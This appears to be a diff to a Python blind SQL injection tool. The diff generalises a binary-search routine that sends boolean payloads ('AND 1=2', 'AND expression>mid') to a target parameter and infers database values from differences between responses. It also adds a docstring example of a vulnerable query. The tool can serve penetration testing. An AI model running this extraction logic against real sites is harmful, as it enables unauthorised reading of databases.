@@ -1,6 +1,6 @@
 from core.Requester import Requester
 from core.Analyzer import Analyzer
-from utils.constants import InjectionContext, differ_length_bool
+from utils.constants import InjectionContext, DIFFER_LENGTH_BOOL
 
 class BooleanInjector:
 	"""
@@ -8,6 +8,14 @@ class BooleanInjector:
 	
 	These vulnerabilities can allow attackers to infer database information
 	by observing differences between true and false query conditions.
+ 
+	For example, if the application does:
+ 
+ 		SELECT first_name, last_name
+		FROM users
+		WHERE id = <input>;
+
+	Boolean SQLi injects into the query's WHERE clause and infers information from different responses.
 	"""
 
 	def __init__(self, requester: Requester, analyzer: Analyzer):
@@ -33,13 +41,13 @@ class BooleanInjector:
 			{ param: f"{ctx.prefix}AND 1=2{ctx.suffix}" }
 		)
 
-		return self.analyzer.responses_differ(r_true, r_false, differ_length_bool)
+		return self.analyzer.responses_differ(r_true, r_false, DIFFER_LENGTH_BOOL)
 
-	def get_expressions_name_length(
-    	self, url: str, param: str, ctx: InjectionContext, expression: str
+	def get_number_returned_by_sql(
+    	self, url: str, param: str, ctx: InjectionContext, expression: str, high: int
     ) -> int:
 		"""
-		Find the expression's name length using binary search
+		Find the number returned by SQL query by using binary search
   		"""
 
 		# Baseline for a query containing a false condition. If another response differs from this,
@@ -51,18 +59,17 @@ class BooleanInjector:
 
 		# Initial range
 		low = 0
-		high = 64
 
 		while low < high:
 			# Integer division to calculate the middle value between low and high
 			mid = (low + high) // 2
 
 			# To check if the name length is higher to the current mid value
-			payload = f"{ctx.prefix}AND LENGTH({expression})>{mid}{ctx.suffix}"
+			payload = f"{ctx.prefix}AND {expression}>{mid}{ctx.suffix}"
 			response = self.requester.send(url, { param: payload })
 
 			# If different then the condition is right
-			if self.analyzer.responses_differ(r_false, response, differ_length_bool):
+			if self.analyzer.responses_differ(r_false, response, DIFFER_LENGTH_BOOL):
 				low = mid + 1
 			else:
 				high = mid
@@ -94,7 +101,7 @@ class BooleanInjector:
 				response = self.requester.send(url, { param: payload })
 
 				# If different then the condition is right
-				if self.analyzer.responses_differ(r_false, response, differ_length_bool):
+				if self.analyzer.responses_differ(r_false, response, DIFFER_LENGTH_BOOL):
 					low = mid + 1
 				else:
 					high = mid
@@ -137,7 +144,7 @@ class BooleanInjector:
 				response = self.requester.send(url, { param: payload })
 
 				# If different then the condition is right
-				if self.analyzer.responses_differ(r_false, response, differ_length_bool):
+				if self.analyzer.responses_differ(r_false, response, DIFFER_LENGTH_BOOL):
 					low = mid + 1
 				else:
 					high = mid
